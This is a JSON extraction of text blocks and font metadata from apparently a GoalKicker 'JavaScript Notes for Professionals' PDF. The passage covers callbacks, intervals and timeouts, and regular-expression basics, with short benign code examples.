        "font_size": 9,
        "img": []
    },
    {
        "text": "This allows the element to be hidden right after the function has \ufb01nished execution. This di\ufb00ers from:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "elem. animate (   {  opacity :   0   },   5000   ); elem. hide ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "because the latter does not wait for  animate ()  (an asynchronous function) to complete, and therefore the element is hidden right away, producing an undesirable e\ufb00ect.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.2: Continuation (synchronous and asynchronous)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Callbacks can be used to provide code to be executed after a method has completed: /**",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " * @arg {Function} then continuation callback  */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  doSomething ( then )   {   console. log ( 'Doing something' );   then (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Do something, then execute callback to log 'done'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "doSomething ( function   ()   {   console. log ( 'Done' ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 215",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 'Doing something else' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Outputs: //   \"Doing something\" //   \"Done\" //   \"Doing something else\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  doSomething ()  method above executes synchronously with the callback - execution blocks until  doSomething () returns, ensuring that the callback is executed before the interpreter moves on. Callbacks can also be used to execute code asynchronously:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "doSomethingAsync ( then )   {   setTimeout ( then ,   1000 );   console. log ( 'Doing something asynchronously' ); } doSomethingAsync ( function ()   {   console. log ( 'Done' ); }); console. log ( 'Doing something else' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Outputs: //   \"Doing something asynchronously\" //   \"Doing something else\" //   \"Done\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  then  callbacks are considered continuations of the  doSomething ()  methods. Providing a callback as the last instruction in a function is called a  tail-call , which is  optimized by ES2015 interpreters .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.3: What is a callback?",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This is a normal function call:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"Hello World!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When you call a normal function, it does its job and then returns control back to the caller. However, sometimes a function needs to return control back to the caller in order to do its job:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 , 2 , 3 ] . map ( function   double ( x )   {      return   2   *  x ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above example, the function  double  is a callback for the function  map  because: The function  double  is given to the function  map  by the caller. 1. The function  map  needs to call the function  double  zero or more times in order to do its job. 2. Thus, the function  map  is essentially returning control back to the caller every time it calls the function  double . Hence, the name  \u201c callback \u201d . Functions may accept more than one callback:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "promise. then ( function  onFulfilled ( value )   {     console. log ( \"Fulfilled with value \"   +  value );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 216",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "},   function  onRejected ( reason )   {     console. log ( \"Rejected with reason \"   +  reason ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here then function  then  accepts two callback functions,  onFulfilled  and  onRejected . Furthermore, only one of these two callback functions is actually called. What's more interesting is that the function  then  returns before either of the callbacks are called. Hence, a callback function may be called even after the original function has returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.4: Callbacks and `this`",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Often when using a callback you want access to a speci\ufb01c context.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  SomeClass ( msg ,  elem )   {    this . msg   =  msg ;   elem. addEventListener ( 'click' ,   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( this . msg );    // <= will fail because \"this\" is undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   }); } var  s  =   new  SomeClass ( \"hello\" ,  someElement );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Solutions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  bind bind  e\ufb00ectively generates a new function that sets  this  to whatever was passed to  bind  then calls the original function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  SomeClass ( msg ,  elem )   {      this . msg   =  msg ;     elem. addEventListener ( 'click' ,   function ()   {       console. log ( this . msg );   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } . bind ( this ));    // <=-  bind the function to `this`    }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Use arrow functions Arrow functions automatically bind the current  this  context.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  SomeClass ( msg ,  elem )   {      this . msg   =  msg ;     elem. addEventListener ( 'click' ,()   =>   {     // <=-  arrow function binds `this`       console. log ( this . msg );         });    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Often you'd like to call a member function, ideally passing any arguments that were passed to the event on to the function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Solutions:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use bind",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  SomeClass ( msg ,  elem )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 217",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     this . msg   =  msg ;     elem. addEventListener ( 'click' ,   this . handleClick . bind ( this ));    }   SomeClass. prototype . handleClick   =   function ( event )   {     console. log ( event. type ,   this . msg );    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Use arrow functions and the rest operator",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  SomeClass ( msg ,  elem )   {      this . msg   =  msg ;     elem. addEventListener ( 'click' ,   ( ... a )   =>   this . handleClick ( ... a ));    }   SomeClass. prototype . handleClick   =   function ( event )   {     console. log ( event. type ,   this . msg );    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For DOM event listeners in particular you can implement the  EventListener  interface",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  SomeClass ( msg ,  elem )   {      this . msg   =  msg ;     elem. addEventListener ( 'click' ,   this );    }   SomeClass. prototype . handleEvent   =   function ( event )   {      var  fn  =   this [ event. type ];      if   ( fn )   {        fn. apply ( this ,  arguments );      }    };     SomeClass. prototype . click   =   function ( event )   {     console. log ( this . msg );    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 29.5: Callback using Arrow function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Using arrow function as callback function can reduce lines of code.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The default syntax for arrow function is",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "()   =>   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be used as callbacks For example if we want to print all elements in an array [1,2,3,4,5] without arrow function, the code will look like this",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 , 2 , 3 , 4 , 5 ] . forEach ( function ( x ){                  console. log ( x );              }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With arrow function, it can be reduced to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 218",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 , 2 , 3 , 4 , 5 ] . forEach ( x  =>  console. log ( x ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here the callback function  function ( x ){ console. log ( x )}  is reduced to  x => console. log ( x )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.6: Error handling and control-\ufb02ow branching",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Callbacks are often used to provide error handling. This is a form of control \ufb02ow branching, where some instructions are executed only when an error occurs:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  expected  =   true ; function  compare ( actual ,  success ,  failure )   {    if   ( actual  ===  expected )   {     success ();    }   else   {     failure ();    } } function  onSuccess ()   {   console. log ( 'Value was expected' ); } function  onFailure ()   {   console. log ( 'Value was unexpected/exceptional' ); } compare ( true ,  onSuccess ,  onFailure ); compare ( false ,  onSuccess ,  onFailure );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Outputs: //   \"Value was expected\" //   \"Value was unexpected/exceptional\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Code execution in  compare ()  above has two possible branches:  success  when the expected and actual values are the same, and  error  when they are di\ufb00erent. This is especially useful when control \ufb02ow should branch after some asynchronous instruction:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  compareAsync ( actual ,  success ,  failure )   {   setTimeout ( function   ()   {     compare ( actual ,  success ,  failure )    },   1000 ); } compareAsync ( true ,  onSuccess ,  onFailure ); compareAsync ( false ,  onSuccess ,  onFailure ); console. log ( 'Doing something else' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Outputs: //   \"Doing something else\" //   \"Value was expected\" //   \"Value was unexpected/exceptional\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It should be noted, multiple callbacks do not have to be mutually exclusive  \u2013  both methods could be called. Similarly, the  compare ()  could be written with callbacks that are optional (by using a  noop  as the default value - see Null Object pattern ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 219",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 30: Intervals and Timeouts",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 30.1: Recursive setTimeout",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To repeat a function inde\ufb01nitely,  setTimeout  can be called recursively:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  repeatingFunc ()   {     console. log ( \"It's been 5 seconds. Execute the function again.\" );     setTimeout ( repeatingFunc ,   5000 ); } setTimeout ( repeatingFunc ,   5000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Unlike  setInterval , this ensures that the function will execute even if the function's running time is longer than the speci\ufb01ed delay. However, it does not guarantee a regular interval between function executions. This behaviour also varies because an exception before the recursive call to  setTimeout  will prevent it from repeating again, while setInterval  would repeat inde\ufb01nitely regardless of exceptions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.2: Intervals",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  waitFunc (){     console. log ( \"This will be logged every 5 seconds\" ); } window. setInterval ( waitFunc , 5000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 30.3: Intervals",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Standard",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You don't need to create the variable, but it's a good practice as you can use that variable with clearInterval to stop the currently running interval.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var   int   =  setInterval ( \"doSomething()\" ,   5000   );   /* 5 seconds */ var   int   =  setInterval ( doSomething ,   5000   );   /* same thing, no quotes, no parens */",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you need to pass parameters to the doSomething function, you can pass them as additional parameters beyond the \ufb01rst two to setInterval.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Without overlapping",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "setInterval, as above, will run every 5 seconds (or whatever you set it to) no matter what. Even if the function doSomething takes long than 5 seconds to run. That can create issues. If you just want to make sure there is that pause in between runnings of doSomething, you can do this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   doSomething ();    setTimeout ( arguments. callee ,   5000 ); })()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 220",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.4: Removing intervals",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "window. setInterval ()  returns an  IntervalID , which can be used to stop that interval from continuing to run. To do this, store the return value of  window. setInterval ()  in a variable and call  clearInterval ()  with that variable as the only argument:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  waitFunc (){     console. log ( \"This will be logged every 5 seconds\" ); }      var  interval  =  window. setInterval ( waitFunc , 5000 ); window. setTimeout ( function (){     clearInterval ( interval ); }, 32000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log  This will be logged every  5  seconds  every 5 seconds, but will stop it after 32 seconds. So it will log the message 6 times.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.5: Removing timeouts",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "window. setTimout ()  returns a  TimeoutID , which can be used to stop that timeout from running. To do this, store the return value of  window. setTimeout ()  in a variable and call  clearTimeout ()  with that variable as the only argument:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  waitFunc (){     console. log ( \"This will not be logged after 5 seconds\" ); } function  stopFunc (){     clearTimeout ( timeout ); } var  timeout  =  window. setTimeout ( waitFunc , 5000 ); window. setTimeout ( stopFunc , 3000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will not log the message because the timer is stopped after 3 seconds.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.6: setTimeout, order of operations, clearTimeout",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "setTimeout",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Executes a function, after waiting a speci\ufb01ed number of milliseconds. used to delay the execution of a function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax :   setTimeout ( function ,  milliseconds )  or  window. setTimeout ( function ,  milliseconds )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example :  This example outputs \"hello\" to the console after 1 second. The second parameter is in milliseconds, so 1000 = 1 sec, 250 = 0.25 sec, etc.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "setTimeout ( function ()   {     console. log ( 'hello' ); },   1000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Problems with setTimeout",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if you're using the  setTimeout  method in a for loop  :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 221",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( i  =   0 ;  i  <   3 ;   ++ i )   {   setTimeout ( function (){     console. log ( i );    },   500 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will output the value  3  three  times, which is not correct. Workaround of this problem :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( i  =   0 ;  i  <   3 ;   ++ i )   {   setTimeout ( function ( j ){     console. log ( i );    }( i ),   1000 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It will output the value  0 , 1 , 2 . Here, we \u2019 re passing the  i  into the function as a parameter( j ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Order of operations",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Additionally though, due to the fact that JavaScript is single threaded and uses a global event loop,  setTimeout  can be used to add an item to the end of the execution queue by calling  setTimeout  with zero delay. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "setTimeout ( function ()   {     console. log ( 'world' ); },   0 ); console. log ( 'hello' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will actually output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "hello world",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Also, zero milliseconds here does not mean the function inside the setTimeout will execute immediately. It will take slightly more than that depending upon the items to be executed remaining in the execution queue. This one is just pushed to the end of the queue.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Cancelling a timeout",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "clearTimeout() :  stops the execution of the function speci\ufb01ed in  setTimeout () Syntax :  clearTimeout(timeoutVariable) or window.clearTimeout(timeoutVariable)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  timeout  =  setTimeout ( function ()   {     console. log ( 'hello' ); },   1000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "clearTimeout ( timeout );   // The timeout will no longer be executed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 222",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 31: Regular expressions",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Flags Details g",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "g lobal. All matches (don't return on the \ufb01rst match). m m ulti-line. Causes  ^  &  $  to match the begin/end of each line (not only begin/end of string). i i nsensitive. Case insensitive match (ignores case of [a-zA-Z]). u u nicode : Pattern strings are treated as  UTF-16 . Also causes escape sequences to match Unicode characters. y stick y : matches only from the index indicated by the lastIndex property of this regular expression in the target string (and does not attempt to match from any later indexes).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.1: Creating a RegExp Object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Standard Creation",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It is recommended to use this form only when creating regex from dynamic variables. Use when the expression may change or the expression is user generated.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   new  RegExp ( \".*\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With \ufb02ags:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   new  RegExp ( \".*\" ,   \"gmi\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With a backslash: (this must be escaped because the regex is speci\ufb01ed with a string)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   new  RegExp ( \" \\\\ w*\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Static initialization",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use when you know the regular expression will not change, and you know what the expression is before runtime.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /.*/ ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With \ufb02ags:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /.*/gmi ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With a backslash: (this should not be escaped because the regex is speci\ufb01ed in a literal)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /\\w*/ ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 31.2: RegExp Flags",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are several \ufb02ags you can specify to alter the RegEx behaviour. Flags may be appended to the end of a regex literal, such as specifying  gi  in  / test / gi , or they may be speci\ufb01ed as the second argument to the  RegExp",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "constructor, as in  new  RegExp ( 'test' ,   'gi' ) .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "g  - Global. Finds all matches instead of stopping after the \ufb01rst. i  - Ignore case.  /[ a - z ]/ i  is equivalent to  /[ a - zA - Z ]/ .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 223",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "m  - Multiline.  ^  and  $  match the beginning and end of each line respectively treating  \\n  and  \\r  as delimiters instead of simply the beginning and end of the entire string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "u  - Unicode. If this \ufb02ag is not supported you must match speci\ufb01c Unicode characters with  \\uXXXX  where  XXXX  is the character's value in hexadecimal. y  - Finds all consecutive/adjacent matches.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.3: Check if string contains pattern using .test()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  re  =   /[a-z]+/ ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( re. test ( \"foo\" ))   {     console. log ( \"Match exists.\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  test  method performs a search to see if a regular expression matches a string. The regular expression  [ a - z ]+ will search for one or more lowercase letters. Since the pattern matches the string,  \u201c match exists \u201d  will be logged to the console.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.4: Matching With .exec()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Match Using  . exec ()",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "RegExp. prototype . exec ( string )  returns an array of captures, or  null  if there was no match.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /([0-9]+)[a-z]+/ ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  match  =  re. exec ( \"foo123bar\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "match. index  is 3, the (zero-based) location of the match. match [ 0 ]  is the full match string. match [ 1 ]  is the text corresponding to the \ufb01rst captured group.  match [ n ]  would be the value of the  n th captured group.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Loop Through Matches Using  . exec ()",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /a/g ; var  result ; while  (( result  =  re. exec ( 'barbatbaz' ))   !==   null )   {     console. log ( \"found '\"   +  result [ 0 ]   +   \"', next exec starts at index '\"   +  re. lastIndex   +   \"'\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output found 'a', next exec starts at index '2' found 'a', next exec starts at index '5' found 'a', next exec starts at index '8'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.5: Using RegExp With Strings",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The String object has the following methods that accept regular expressions as arguments.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 224",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"string\" . match ( ... \"string\" . replace ( ... \"string\" . split ( ... \"string\" . search ( ...",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Match with RegExp",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"string\" . match ( /[i-n]+/ )); console. log ( \"string\" . match ( /(r)[i-n]+/ ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output Array [\"in\"] Array [\"rin\", \"r\"]",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Replace with RegExp",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"string\" . replace ( /[i-n]+/ ,   \"foo\" ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output strfoog",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Split with RegExp",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"stringstring\" . split ( /[i-n]+/ ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output Array [\"str\", \"gstr\", \"g\"]",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Search with RegExp",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". search ()  returns the index at which a match is found or -1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"string\" . search ( /[i-n]+/ )); console. log ( \"string\" . search ( /[o-q]+/ ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output 3 -1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.6: RegExp Groups",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript supports several types of group in its Regular Expressions,  capture groups ,  non-capture groups  and  look- aheads . Currently, there is no  look-behind  support.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Capture",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sometimes the desired match relies on its context. This means a simple  RegExp  will over-\ufb01nd the piece of the  String",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 225",
        "font_name": "Quicksand-Regular",
